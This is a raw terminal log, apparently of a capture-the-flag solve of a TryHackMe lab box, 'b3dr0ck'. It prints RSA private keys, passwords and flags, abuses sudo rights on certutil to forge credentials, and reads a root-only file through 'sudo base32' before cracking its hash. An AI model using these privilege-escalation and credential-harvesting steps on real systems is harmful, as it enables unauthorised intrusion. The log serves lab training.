@@ -1,0 +1,331 @@
+root@ip-10-10-81-185:~# ping 10.10.153.241
+PING 10.10.153.241 (10.10.153.241) 56(84) bytes of data.
+64 bytes from 10.10.153.241: icmp_seq=1 ttl=64 time=4.19 ms
+64 bytes from 10.10.153.241: icmp_seq=2 ttl=64 time=0.429 ms
+^C
+--- 10.10.153.241 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1001ms
+rtt min/avg/max/mdev = 0.429/2.314/4.199/1.885 ms
+root@ip-10-10-81-185:~# nc 10.10.153.241 9009
+
+
+ __          __  _                            _                   ____   _____ 
+ \ \        / / | |                          | |            /\   |  _ \ / ____|
+  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
+   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
+    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
+     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
+                                                                               
+                                                                               
+
+
+What are you looking for? use
+Sorry, unrecognized request: 'use'
+
+You use this service to recover your client certificate and private key
+What are you looking for? user
+Sorry, unrecognized request: 'user'
+
+You use this service to recover your client certificate and private key
+What are you looking for? help
+Looks like the secure login service is running on port: 54321
+
+Try connecting using:
+socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
+What are you looking for? cert
+Sounds like you forgot your certificate. Let's find it for you...
+
+-----BEGIN CERTIFICATE-----
+MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
+dDAeFw0yMjA4MjgwMzM0NDJaFw0yMzA4MjgwMzM0NDJaMBgxFjAUBgNVBAMMDUJh
+cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDSS2VT
+Rm/JP+nfWR6toPFuoTp2T5q1P9V/J4Ybf8XMKTZPqPGtlSzsX7w9nMs0djMwmgVM
+qpQxHFZqe/q5g3jxOiD51ZEDUoZQdSAqN4BS/dvG2LqiHLyLLiHa6i0xzJYAvRiW
+5zsZG4RDGsQriepz0Z7ZGp/L7Ovd01nlzsKkCWQi4v8THPmInhRd8Eb9vTNlhaY2
++VXve/EBIs2ay1YT2VIpPLe3NSaOZScCiRk4NRJBquYv0/oSVqV5flphaCjt6pjt
+xUum2zGX7QHtDPKknXzufREleIizzfR/v16d77rvmM5yM3zbvl4MVLsun+SyMIQr
+qSAC1nxAzCwIPn+NAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAHBofgJ8zYqEUpqq
+XTWKOoGxB5i+Xmvcvq5Shc/dKNnLxXUjxYsA4tUbDy6Qme3mNjJhi001OUBLCFjl
+iz4mu2F9H16mWkpjHd/i8mg/Ekqr3hG+6LaoR0ZyFLaWWfDKAbgPgHbX7s2HYBBv
+5lBuamP3Ial/JkURmlQZ5Pp5h0W2YOyo1kKtAH5Y7wfGDLjD1SGZbPMhUA5Y/xc2
+O27Gz/bIi1nbvTgqsFhwblCerVJr2WJ4II+4o1omVHbAvBxIf58gFta6CGTjMM5y
+oKdKziAGb6wclqKtJh8/7rLh8ywuTdJlge3Hf1JXiJOKko/xyoN4DhXT/QKdAipY
+ZH5228Y=
+-----END CERTIFICATE-----
+
+
+What are you looking for? key
+Sounds like you forgot your private key. Let's find it for you...
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpgIBAAKCAQEA0ktlU0ZvyT/p31keraDxbqE6dk+atT/VfyeGG3/FzCk2T6jx
+rZUs7F+8PZzLNHYzMJoFTKqUMRxWanv6uYN48Tog+dWRA1KGUHUgKjeAUv3bxti6
+ohy8iy4h2uotMcyWAL0Yluc7GRuEQxrEK4nqc9Ge2Rqfy+zr3dNZ5c7CpAlkIuL/
+Exz5iJ4UXfBG/b0zZYWmNvlV73vxASLNmstWE9lSKTy3tzUmjmUnAokZODUSQarm
+L9P6ElaleX5aYWgo7eqY7cVLptsxl+0B7QzypJ187n0RJXiIs830f79ene+675jO
+cjN8275eDFS7Lp/ksjCEK6kgAtZ8QMwsCD5/jQIDAQABAoIBAQDGv9E0wiZWatxr
+ZXwUFz73EtQBCz0pPfpWYZFingDf8rdM1FwNdSZvBBARnwWCQJAix/5oNfM28xRN
+MX2GJVaBjjGqTYjvPeiJVBkhLTFPvnMfXKgPHN+pHuGKV7Z9EWFXs1/xBvsYwKPh
+FAQBLihya9QYVgxenD1TejPFeQMGKc9tmPmKos5Ur3MibKTuTp+TQYuqbPZpGaD7
+i3u6jwn+P8vVh1zWw82FUfmIvh8E7okV33dA2tjT/YnggE1nm+2+Kvb32A/FAdeO
+3Ia/G41O1QolZVt/MpNonN2msMm1S5ZW6J/OjfoyrETeCfKOqQ1GLPAWwaeTESf0
+YuXaFx3VAoGBAOnF7q0gTWQuV7RHv0d4ujs5HZVbbs95ui1S9zfeBs6ASdYjL+1O
+fVKTpwDbd90QesF0UfevGXLCJNVL6TX6IVOvFB6Gx8Dh/cG9U5uaDYRK0NzIgAZM
+EX2ERXbO8XEz3JLpS0Z/MLoKTrDjGmXJaD4TnDiuxhLXpw7Jdt6tytVPAoGBAOZJ
+/XQkqbIHubXP0noQ73QTdFmIu1zTt/XX0lq0Q0KxaA3qomHsfbLvURw3whl6b+QP
+AfVVYmh390OnDKrsex+dtL5Dsp972vvRgYyZJLwUk6WSxx05AlFMfQ/WvpNO7noC
+xwhuFkuIwPbGPruc151MYirlPp1fp/Pq8NNXFV5jAoGBALZO0syW5WPcNC92yHgP
+cYSgDS8eJ/OLZaLVEdCyyLIgH/TsagLx9BAC7/leLkLrCCB3+zhiiEEToK/qzEt4
+7qaZYeJQj9UfKMr/QAWYBTSHOA0GG7lNd1JgZd+6kVYL8NdtMnQe2rwrL6UI5tw8
+TpwipPEbc4LcRP7mJFqSRB1HAoGBAN53leiwTlrVCbuw44TWfWxmKt0fsNixEyLk
+9qp3QA7asUnYZDwzKQ9GD9Yxq0nPtO3c7ahibum7EtyBMUShpSPaxzOS1KkrDlZ8
+gyke/JTRT/0AuWfqnemJ+brmWj6WXtzxd/MV3mXj233J7+pwTv7/PkpwIbgII4kI
+atPPaa4/AoGBALMfQSzPoao6APMc4Im+TtKEseivEbMv9AXyNUWZMiPok4E3sMZe
+8jg3aLbVpukilvs14EqKO+RGFyAP09ZHZevDfxCVYopEnzF+wMHowHrM1f9RTah0
+QNfxK/hEZdnrJeGDMeO4ZTUh9qmMxclNxCy3r3yoPiF5vZtjXCZYOnn8
+-----END RSA PRIVATE KEY-----
+
+
+What are you looking for? 
+root@ip-10-10-81-185:~# mkdir bedrock
+root@ip-10-10-81-185:~# ls
+bedrock  Downloads     Pictures  Rooms    thinclient_drives
+Desktop  Instructions  Postman   Scripts  Tools
+root@ip-10-10-81-185:~# cd bedrock/
+root@ip-10-10-81-185:~/bedrock# nano cert_file
+root@ip-10-10-81-185:~/bedrock# nano key_file
+root@ip-10-10-81-185:~/bedrock# socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
+bash: CERT_FILE: No such file or directory
+root@ip-10-10-81-185:~/bedrock# socat stdio ssl:10.10.153.241:54321,cert=cert_file,key=key_file,verify=0
+
+
+ __     __   _     _             _____        _     _             _____        _ 
+ \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
+  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
+   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
+    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
+    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
+                                                                                 
+                                                                                 
+
+Welcome: 'Barney Rubble' is authorized.
+b3dr0ck> whoami
+Current user = 'Barney Rubble' (valid peer certificate)
+b3dr0ck> pwd
+Unrecognized command: 'pwd'
+
+This service is for login and password hints
+b3dr0ck> ls
+Unrecognized command: 'ls'
+
+This service is for login and password hints
+b3dr0ck> dir
+Unrecognized command: 'dir'
+
+This service is for login and password hints
+b3dr0ck> cd
+Unrecognized command: 'cd'
+
+This service is for login and password hints
+b3dr0ck> help
+Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
+b3dr0ck> 
+
+root@ip-10-10-81-185:~/bedrock# ssh barney@10.10.153.241
+The authenticity of host '10.10.153.241 (10.10.153.241)' can't be established.
+ECDSA key fingerprint is SHA256:wQ21BG+EOKJCF/4/7AIY9n8e86E7MAN2gH/J/+koWk4.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.153.241' (ECDSA) to the list of known hosts.
+barney@10.10.153.241's password: 
+barney@b3dr0ck:~$ whoami
+barney
+barney@b3dr0ck:~$ pwd
+/home/barney
+barney@b3dr0ck:~$ ls
+barney.txt
+barney@b3dr0ck:~$ cat barney.txt 
+THM{f05780f08f0eb1de65023069d0e4c90c}
+barney@b3dr0ck:~$ 
+
+barney@b3dr0ck:/home/fred$ sudo -l
+[sudo] password for barney: 
+
+There's nothing wrong with you that an expensive operation can't prolong.
+[sudo] password for barney: 
+Speak English you fool --- there are no subtitles in this scene.
+[sudo] password for barney: 
+Matching Defaults entries for barney on b3dr0ck:
+    insults, env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User barney may run the following commands on b3dr0ck:
+    (ALL : ALL) /usr/bin/certutil
+barney@b3dr0ck:/home/fred$ 
+
+barney@b3dr0ck:/home/fred$ sudo -l
+[sudo] password for barney: 
+
+There's nothing wrong with you that an expensive operation can't prolong.
+[sudo] password for barney: 
+Speak English you fool --- there are no subtitles in this scene.
+[sudo] password for barney: 
+Matching Defaults entries for barney on b3dr0ck:
+    insults, env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User barney may run the following commands on b3dr0ck:
+    (ALL : ALL) /usr/bin/certutil
+barney@b3dr0ck:/home/fred$ /usr/bin/certutil
+
+Cert Tool Usage:
+----------------
+
+Show current certs:
+  certutil ls
+
+Generate new keypair:
+  certutil [username] [fullname]
+
+barney@b3dr0ck:/home/fred$ /usr/bin/certutil ls
+
+Current Cert List: (/usr/share/abc/certs)
+------------------
+total 56
+drwxrwxr-x 2 root root 4096 Apr 30 21:54 .
+drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
+-rw-r----- 1 root root  972 Aug 28 03:34 barney.certificate.pem
+-rw-r----- 1 root root 1678 Aug 28 03:34 barney.clientKey.pem
+-rw-r----- 1 root root  894 Aug 28 03:34 barney.csr.pem
+-rw-r----- 1 root root 1674 Aug 28 03:34 barney.serviceKey.pem
+-rw-r----- 1 root root  976 Aug 28 03:34 fred.certificate.pem
+-rw-r----- 1 root root 1674 Aug 28 03:34 fred.clientKey.pem
+-rw-r----- 1 root root  898 Aug 28 03:34 fred.csr.pem
+-rw-r----- 1 root root 1674 Aug 28 03:34 fred.serviceKey.pem
+
+
+barney@b3dr0ck:/home/fred$ /usr/bin/certutil cat fred.certificate.pem
+node:internal/fs/utils:345
+    throw err;
+    ^
+
+Error: EACCES: permission denied, open '/usr/share/abc/certs/server.serviceKey.pem'
+    at Object.openSync (node:fs:585:3)
+    at Object.readFileSync (node:fs:453:35)
+    at generateCredentials (/usr/share/abc/dist/certs.js:1:3060)
+    at Object.<anonymous> (/usr/share/abc/dist/certs.js:1:3518)
+    at Module._compile (node:internal/modules/cjs/loader:1105:14)
+    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1159:10)
+    at Module.load (node:internal/modules/cjs/loader:981:32)
+    at Function.Module._load (node:internal/modules/cjs/loader:822:12)
+    at Module.require (node:internal/modules/cjs/loader:1005:19)
+    at require (node:internal/modules/cjs/helpers:102:18) {
+  errno: -13,
+  syscall: 'open',
+  code: 'EACCES',
+  path: '/usr/share/abc/certs/server.serviceKey.pem'
+}
+barney@b3dr0ck:/home/fred$ sudo /usr/bin/certutil cat fred.certificate.pem
+Generating credentials for user: cat (fredcertificatepem)
+Generated: clientKey for cat: /usr/share/abc/certs/cat.clientKey.pem
+Generated: certificate for cat: /usr/share/abc/certs/cat.certificate.pem
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAzWjB1KgA3v3Y71AeDU0xRHbA6uZNiuhoOxKEYsrzLT1Eqip3
+dwqs+96lGbufZ9ZJPJx60AKLG7rXrBQB7CdRhXApEhAgx/YztHLUNRhIgBeB1/Tz
+kuRYdDJ1RteIqodnNyzU9e1iGv+GJtJIrdCnS3FILiazQUv5Kn/TZrmqSGK9N9xL
+MTPqMrXNQddd7IuWQa6UCiKDNmlmi/sgOw3ZW6Dq/+6AQmz2E+9UVABUZoyEfYlU
+zDiPWZT4Uxm0ZusACtmqaDoWBKKQzF+qZ7eT9iK1RXAM1HpGMP6riBatlECamAMG
+S0MTbR2BVsEip+L+wcX54kOOyMwGu88qry8k5wIDAQABAoIBACzesViuymHrubOt
+IKNvNU/rUQD/BflOA1bEGL8r7ir3s0Qouqf6YQcz/4S7g3q/SIhA9mLx60lHa01f
+oXvgquInOhGEDGUh1vGYE9r1TwEMIYT3MS3pS5k2XH/5HRWDNnzLAkombMPRBZD9
+ZnrxlVnZiRbrxUSCQA+UlK1f6V6eLoeTxJ2UNOTEbbEeiYAswptfwkCMZizrdrEs
+ZQfpHiN2J0wR1hUpsDtEd8wcfC3MY0LLaaJhI1ylr8SicP/xif89lW5auGRVjHux
+k+0pV5y9+dQYi7ryjtK3fsfkmgALdFIug3rqHpPpQw0EpqnrqlWtv5+nG3t36xHd
+yrtuYyECgYEA+Sg3mhQn4OkVFoiV79VFbnHF7wH8Fqyen4o2C1ijUKCJ5YJLIqrz
+7Q+eTvEuqYp/84BKRjpf2Va3kMQ1haHqYcpC4LDSsMASsVjnfu1674kWJWiug6dw
+y94QJJUesB9QaYxiMquY+Dry845TdgiDXI2CE+SjDMsz0aqt2AL0Wa0CgYEA0wz0
+qDhI3NngeRws2sP5f7fVOzxj0XDxRD3euIkujoOmdT/13u7QIb+jAl8YMG8HnKm5
+k8uFNMyOW7boX6b8k/Ay2c+4h/naCHxx9CMXuEYJp6Tr4jzgGk9iqZRrVNpW5lcu
+2i3DQe2SygpiBVfgBb9i6x2fc0f+qXuxJ+B/M2MCgYEA3MIAedlP+BwsnhmI18Yc
+TZ4q5PjaNfDeXrcj6Wuw0Bhd9ec60U2s8Kc8+e8CDB/1/Hb32D+Se0w1OuROE8gB
+loGSPekN1KNqLI58Fl8t5JyO7bhRn7601z07Cl7BoQUtx0cmHoUh9Rat+pRpaJRk
+Z5XN4fhba1OD50qV22XKwMUCgYADvE74S0a+4fxfKGiC1sUrxY04pzD9HAqpMo8m
+pQb17s6bdK5da8yzTDkOabB76vsvgrGONCP/cz9x0CL8zm/aDn5X7J1PitSZIdrC
+f3yD/nldRkYGkx1EWfNdHQtpTRQMr65cnkK+f/4BJX3mqk+EyoZtsvCHkdaoGVBh
+bE/UEQKBgQDzkVAmYwQpecL6Uhsq4y6HpjRibWtAxfBJUW945JS9wo3pVKCX7hwB
+cRlYIqCKlTxVWdFU9HMN7Ha5v+AzsjsW5sDhYhAVYKQRVrVgLjlbQyQGucqulMw/
+JsfMHoMX37B8V4hc21OagOk8PjJbhE9alwbdX8v/Kx1dhvhJEA2FWA==
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIICpjCCAY4CAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
+dDAeFw0yMjA4MjgwMzUxMzBaFw0yMjA4MjkwMzUxMzBaMB0xGzAZBgNVBAMMEmZy
+ZWRjZXJ0aWZpY2F0ZXBlbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
+AM1owdSoAN792O9QHg1NMUR2wOrmTYroaDsShGLK8y09RKoqd3cKrPvepRm7n2fW
+STycetACixu616wUAewnUYVwKRIQIMf2M7Ry1DUYSIAXgdf085LkWHQydUbXiKqH
+Zzcs1PXtYhr/hibSSK3Qp0txSC4ms0FL+Sp/02a5qkhivTfcSzEz6jK1zUHXXeyL
+lkGulAoigzZpZov7IDsN2Vug6v/ugEJs9hPvVFQAVGaMhH2JVMw4j1mU+FMZtGbr
+AArZqmg6FgSikMxfqme3k/YitUVwDNR6RjD+q4gWrZRAmpgDBktDE20dgVbBIqfi
+/sHF+eJDjsjMBrvPKq8vJOcCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAeoqc07ek
+OF/6b3bD4MyU06Ns6S2BafBex9ui20WA6nZ1iSbwUZa7LSjedawwSSDoUDJzdlam
+3vWgcmfSL2Ot3VG54iC9tJGFOEVyfISs3NZRnxgyviZcmG9MuoATeVmNgYMHtngF
+vmEwMCWLFrUMcKO74uroN3+BnJPQmVX1gU7/yIkMEaHaGq7OlXkxoPaPTbsXB7Zi
+G2l6GK8u110u2JgdY+UqlpWvAqg9kV5eOh3Ffcnl9CU8XBJzuBz1nS8rUkcXhdUF
+NJI4ESvhgJ9m7VVIVLQV+XIDkwsyO/zgTY8cZ3l2z+cJpfclP/4fYE5r098JppOz
+Kxwkaa6Hha4P+g==
+-----END CERTIFICATE-----
+barney@b3dr0ck:/home/fred$ 
+
+
+----------------------------------------------------
+root@ip-10-10-81-185:~/bedrock# socat stdio ssl:10.10.153.241:54321,cert=fred_cert,key=fred_key,verify=0
+
+
+ __     __   _     _             _____        _     _             _____        _ 
+ \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
+  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
+   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
+    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
+    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
+                                                                                 
+                                                                                 
+
+Welcome: 'fredcertificatepem' is authorized.
+b3dr0ck> help
+Password hint: YabbaDabbaD0000! (user = 'fredcertificatepem')
+b3dr0ck> 
+root@ip-10-10-81-185:~/bedrock# ssh fred@10.10.153.241
+fred@10.10.153.241's password: 
+fred@b3dr0ck:~$ whoami
+fred
+fred@b3dr0ck:~$ ls
+fred.txt
+fred@b3dr0ck:~$ cat fred.txt 
+THM{08da34e619da839b154521da7323559d}
+fred@b3dr0ck:~$ 
+
+
+
+---------------------
+fred@b3dr0ck:~$ sudo /usr/bin/base32 /root/pass.txt
+JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE
+4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===
+fred@b3dr0ck:~$ 
+
+fred@b3dr0ck:~$ sudo /usr/bin/base32 /root/pass.txt | base32 -d
+LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
+LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK --> a00a12aad6b7c16bf07032bd05a31d56
+fred@b3dr0ck:~$ 
+a00a12aad6b7c16bf07032bd05a31d56	md5	flintstonesvitamins
+
+sudo: root: command not found
+fred@b3dr0ck:~$ su root
+Password: 
+root@b3dr0ck:/home/fred# whoami
+root
+root@b3dr0ck:/home/fred# cd /root
+root@b3dr0ck:~# ls
+pass.txt  root.txt  snap
+root@b3dr0ck:~# cat pass.txt 
+LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
+root@b3dr0ck:~# cat root.txt 
+THM{de4043c009214b56279982bf10a661b7}
+root@b3dr0ck:~# 
